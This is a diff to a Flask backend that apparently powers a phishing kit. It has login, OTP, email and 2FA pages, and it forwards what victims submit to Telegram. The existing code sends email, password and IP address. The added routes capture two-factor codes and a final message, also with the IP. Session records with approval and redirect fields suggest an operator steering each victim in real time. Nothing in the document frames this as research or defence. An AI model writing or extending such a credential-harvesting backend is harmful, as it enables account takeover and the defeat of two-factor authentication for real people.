@@ -21,6 +21,8 @@ PAGES = [
     {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
     {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
     {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
+    {"emoji": "🔐", "text": "2FA", "page": "2fa.html"},
+    {"emoji": "✅", "text": "THANK YOU", "page": "thks.html"},
 ]
 
 def send_to_telegram(data, session_id, type_):
@@ -108,6 +110,46 @@ def email():
 
     if not send_to_telegram({"email": email, "password": password, "ip": ip}, session_id, "email"):
         print("Email error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
+
+    return jsonify({"success": True, "id": session_id}), 200
+
+@app.route("/2fa", methods=["POST"])
+def twofa():
+    data = request.get_json()
+    if not data or "code" not in data:
+        print("2FA error: Missing code")
+        return jsonify({"success": False, "error": "Missing code"}), 400
+
+    code = data["code"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
+
+    SESSION_STATUS[session_id] = {"type": "2fa", "approved": False, "redirect_url": None}
+    print("2FA session created:", session_id)
+
+    if not send_to_telegram({"2fa_code": code, "ip": ip}, session_id, "2fa"):
+        print("2FA error: Telegram send failed")
+        return jsonify({"success": False, "error": "Telegram failed"}), 500
+
+    return jsonify({"success": True, "id": session_id}), 200
+
+@app.route("/thks", methods=["POST"])
+def thks():
+    data = request.get_json()
+    if not data or "message" not in data:
+        print("Thks error: Missing message")
+        return jsonify({"success": False, "error": "Missing message"}), 400
+
+    message = data["message"]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    session_id = str(uuid.uuid4())
+
+    SESSION_STATUS[session_id] = {"type": "thks", "approved": False, "redirect_url": None}
+    print("Thks session created:", session_id)
+
+    if not send_to_telegram({"final_message": message, "ip": ip}, session_id, "thks"):
+        print("Thks error: Telegram send failed")
         return jsonify({"success": False, "error": "Telegram failed"}), 500
 
     return jsonify({"success": True, "id": session_id}), 200
